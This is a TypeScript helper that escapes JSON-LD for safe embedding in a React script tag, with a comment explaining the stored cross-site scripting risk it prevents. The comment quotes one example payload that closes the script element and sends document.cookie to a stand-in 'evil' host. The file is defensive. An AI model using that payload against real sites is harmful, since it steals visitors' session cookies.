/**
 * Serialize a value for embedding inside a <script type="application/ld+json">
 * block written with dangerouslySetInnerHTML.
 *
 * JSON.stringify alone is not safe here. A JSON string may legally contain the
 * sequence `</script>`, and the HTML parser ends the script element at the first
 * `</script` it sees regardless of where it appears in the text. So a stored
 * title like:
 *
 *   Widgets</script><img src=x onerror="fetch('//evil/'+document.cookie)">
 *
 * is serialized as an ordinary JSON string, terminates the JSON-LD block early,
 * and everything after it is parsed as live HTML. That is a stored XSS in every
 * visitor's browser, driven by any field an editor can type into — event titles,
 * product names, academy titles.
 *
 * Escaping `<` as the < escape keeps the payload inside the JSON string while
 * remaining valid JSON: JSON parsers decode it back to `<`, and the HTML parser
 * no longer sees a closing tag. U+2028/U+2029 are escaped too because they are
 * valid in JSON strings but are line terminators in JavaScript, which breaks any
 * consumer that evaluates the block.
 *
 * The lesson renderer's own dangerouslySetInnerHTML is a separate, deliberate
 * case and is sanitized with DOMPurify.
 */
export function serializeJsonLd(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}
